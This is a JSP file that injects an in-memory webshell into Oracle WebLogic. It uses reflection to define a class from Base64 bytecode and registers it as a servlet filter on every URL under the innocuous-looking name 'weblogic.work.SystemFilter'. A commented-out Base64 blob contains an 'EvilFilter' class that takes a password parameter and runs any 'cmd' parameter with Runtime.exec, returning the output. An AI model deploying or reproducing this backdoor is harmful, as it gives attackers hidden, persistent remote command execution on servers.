<%@page import="java.lang.reflect.Field"%>
<%@page import="java.lang.reflect.Method"%>
<%@page import="java.util.Map"%>
<%

//Thread.getCurrentThread();

//Runtime.getRuntime().exec("calc");

//((weblogic.work.ExecuteThread)Thread.currentThread()).getContextClassLoader().loadClass("java.lang.Runtime");

try {
	byte[] codeClass = java.util.Base64.getDecoder().decode("");
	ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();
	java.lang.reflect.Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
	define.setAccessible(true);
	Class evilFilterClass  = (Class)define.invoke(cl,codeClass,0,codeClass.length);
	
	
	
            Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
            java.lang.reflect.Method m = executeThread.getDeclaredMethod("getCurrentWork");
            Object currentWork = m.invoke(Thread.currentThread());

            java.lang.reflect.Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
            connectionHandlerF.setAccessible(true);
            Object obj = connectionHandlerF.get(currentWork);

            java.lang.reflect.Field requestF = obj.getClass().getDeclaredField("request");
            requestF.setAccessible(true);
            obj = requestF.get(obj);

            java.lang.reflect.Field contextF = obj.getClass().getDeclaredField("context");
            contextF.setAccessible(true);
            Object context = contextF.get(obj);

         //   java.lang.reflect.Field classLoaderF = context.getClass().getDeclaredField("classLoader");
         //   classLoaderF.setAccessible(true);
         //   ClassLoader cl = (ClassLoader) classLoaderF.get(context);

            java.lang.reflect.Field cachedClassesF = cl.getClass().getDeclaredField("cachedClasses");
            cachedClassesF.setAccessible(true);
            Object cachedClass = cachedClassesF.get(cl);

            java.lang.reflect.Method getM = cachedClass.getClass().getDeclaredMethod("get", Object.class);
            if (getM.invoke(cachedClass, "shell") == null) {
             //   byte[] codeClass = java.util.Base64.getDecoder().decode("yv66vgAAADQAfQoAGQA5CQA6ADsIADwKAD0APggAMgsAPwBACAAzCgBBAEIIAEMKAEEARAgARQcARgoARwBICgBHAEkKAEoASwoADABMCABNCgAMAE4KAAwATwsAUABRCgBSAD4KAFIAUwsAVABVBwBWBwBXBwBYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAxMRXZpbEZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwBZAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQADcHdkAQADY21kAQANU3RhY2tNYXBUYWJsZQcAWgcAWwEAClNvdXJjZUZpbGUBAA9FdmlsRmlsdGVyLmphdmEMABsAHAcAXAwAXQBeAQArPT09PT09PT09PT09PT0gaW4gZXZpbGZpbHRlciA9PT09PT09PT09PT09PQcAXwwAYABhBwBiDABjAGQHAFoMAGUAZgEACGt1cm9uM2swDABnAGgBACo9PT09PT09PT09PT09PSAgcnVubmluZyBjbWQgPT09PT09PT09PT09PT0BABFqYXZhL3V0aWwvU2Nhbm5lcgcAaQwAagBrDABsAG0HAG4MAG8AcAwAGwBxAQACXEEMAHIAcwwAdAB1BwB2DAB3AHgHAHkMAHoAHAcAewwAKAB8AQAKRXZpbEZpbHRlcgEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAHaXNFbXB0eQEAAygpWgEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAD2dldE91dHB1dFN0cmVhbQEAJSgpTGphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbTsBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW0BAAVmbHVzaAEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWACEAGAAZAAEAGgAAAAMAAQAbABwAAQAdAAAALwABAAEAAAAFKrcAAbEAAAACAB4AAAAGAAEAAAAJAB8AAAAMAAEAAAAFACAAIQAAAAEAIgAjAAIAHQAAADUAAAACAAAAAbEAAAACAB4AAAAGAAEAAAAOAB8AAAAWAAIAAAABACAAIQAAAAAAAQAkACUAAQAmAAAABAABACcAAQAoACkAAgAdAAABEgAEAAcAAABysgACEgO2AAQrEgW5AAYCADoEKxIHuQAGAgA6BRkFtgAImgBIGQQSCbYACpkAPrIAAhILtgAEuwAMWbgADRkFtgAOtgAPtwAQEhG2ABK2ABM6Biy5ABQBABkGtgAVLLkAFAEAtgAWpwALLSssuQAXAwCxAAAAAwAeAAAALgALAAAAEgAIABMAEgAUABwAFgAuABcANgAYAFIAGQBdABoAZgAcAGkAHQBxAB8AHwAAAEgABwBSABQAKgArAAYAAAByACAAIQAAAAAAcgAsAC0AAQAAAHIALgAvAAIAAAByADAAMQADABIAYAAyACsABAAcAFYAMwArAAUANAAAAAwAAv0AaQcANQcANQcAJgAAAAYAAgA2ACcAAQA3AAAAAgA4");
             //   java.lang.reflect.Method defineClass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             //   defineClass.setAccessible(true);
             //   Class evilFilterClass = (Class) defineClass.invoke(cl, codeClass, 0, codeClass.length);

                String evilName = "weblogic.system.method";
                String filterName = "weblogic.work.SystemFilter";
                String[] url = new String[]{"/*"};

                java.lang.reflect.Method putM = cachedClass.getClass().getDeclaredMethod("put", Object.class, Object.class);
                putM.invoke(cachedClass, filterName, evilFilterClass);
                java.lang.reflect.Method getFilterManagerM = context.getClass().getDeclaredMethod("getFilterManager");
                Object filterManager = getFilterManagerM.invoke(context);

                java.lang.reflect.Method registerFilterM = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, java.util.Map.class, String[].class);
                registerFilterM.setAccessible(true);
                registerFilterM.invoke(filterManager, evilName, filterName, url, null, null, null);
            }
			
        } catch (Exception e) {
            e.printStackTrace();
        }
%>